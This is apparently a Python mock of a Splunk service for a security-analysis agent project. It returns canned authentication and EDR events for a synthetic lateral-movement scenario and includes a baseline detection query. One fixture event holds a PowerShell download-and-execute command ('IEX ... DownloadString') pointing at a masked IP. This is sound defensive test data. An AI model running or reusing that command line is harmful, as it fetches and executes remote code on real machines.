"""B4 — mock Splunk Service so Lane B builds with NO live Splunk (decoupled from Lane A).

Two jobs:
  1. Satisfy Agent.__aenter__, which calls
     service.get(path_segment='authentication/current-context', output_mode='json')
     to resolve the Splunk username (captured in the Day-0 spike).
  2. Provide jobs.oneshot(spl) returning canned rows for the seeded
     lateral-movement scenario, so SPL tools work before the trial is up.

At Lane-A merge (B5) this whole module is replaced by:
    from splunklib.client import connect
    service = connect(host=..., port=8089, token=...)
...with NO change to the agents or tools that consume it (same .jobs.oneshot API).
"""
from __future__ import annotations

import json
from typing import Any


# ---- Seeded synthetic lateral-movement scenario (the demo floor) ----
# A compromised service account 'svc_backup' pivots from WKS-014 across 8 hosts
# via SMB admin$ shares, after a suspicious PowerShell download on WKS-014.
SEED_AUTH_EVENTS: list[dict[str, Any]] = [
    {"_time": "2026-05-31T02:11:04Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "FS-01", "share": "admin$"},
    {"_time": "2026-05-31T02:11:47Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "FS-02", "share": "admin$"},
    {"_time": "2026-05-31T02:12:33Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "DC-01", "share": "admin$"},
    {"_time": "2026-05-31T02:13:58Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "APP-03", "share": "admin$"},
    {"_time": "2026-05-31T02:14:40Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "APP-04", "share": "admin$"},
]

SEED_EDR_EVENTS: list[dict[str, Any]] = [
    {"_time": "2026-05-31T02:08:12Z", "index": "edr", "host": "WKS-014",
     "user": "jdoe", "process": "powershell.exe",
     "cmdline": "powershell -enc <b64> IEX(New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')",
     "signal": "suspicious_download"},
    {"_time": "2026-05-31T02:10:55Z", "index": "edr", "host": "WKS-014",
     "user": "svc_backup", "process": "PsExec.exe",
     "cmdline": "PsExec.exe \\\\FS-01 -u svc_backup cmd", "signal": "remote_exec_tool"},
]

# The current (over-firing) detection that the Detection Engineer will improve.
SEED_CURRENT_DETECTION_SPL = (
    'index=auth action=logon logon_type=3\n'
    '| stats dc(dest) as distinct_dests by user\n'
    '| where distinct_dests > 3'
)


class _Resp:
    def __init__(self, body: str):
        self.body = body


class _Jobs:
    def oneshot(self, query: str, **kwargs) -> list[dict[str, Any]]:
        """Return canned rows keyed off the SPL. Real service returns a
        results reader; we return a list[dict] and the tools normalize either.
        """
        q = query.lower()
        if "index=auth" in q or "admin$" in q or "logon_type" in q:
            return list(SEED_AUTH_EVENTS)
        if "index=edr" in q or "powershell" in q or "process=" in q:
            return list(SEED_EDR_EVENTS)
        if "makeresults" in q:
            return [{"_time": "now", "count": "1"}]
        # default: union of both indexes for broad correlation queries
        return list(SEED_AUTH_EVENTS) + list(SEED_EDR_EVENTS)


class MockService:
    """Drop-in stand-in for splunklib.client.Service (mock-mode)."""

    def __init__(self, username: str = "sentinel-analyst"):
        self._username = username
        self.jobs = _Jobs()

    def get(self, path_segment: str, **kwargs) -> _Resp:
        if path_segment == "authentication/current-context":
            return _Resp(json.dumps({"entry": [{"content": {"username": self._username}}]}))
        return _Resp(json.dumps({"entry": []}))
